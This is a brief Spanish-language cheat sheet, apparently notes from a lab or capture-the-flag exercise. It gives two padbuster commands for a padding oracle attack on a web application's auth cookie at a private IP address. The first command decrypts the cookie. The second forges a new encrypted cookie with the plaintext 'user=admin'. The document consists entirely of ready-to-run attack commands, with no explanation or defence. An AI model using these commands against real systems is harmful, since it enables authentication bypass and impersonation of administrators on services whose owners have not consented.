
### EXPLOTAR PADDING ORACLE
```shell
padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0
```

### ASIGNAR NUEVOS VALORES
```shell
padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth=2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user=admin
```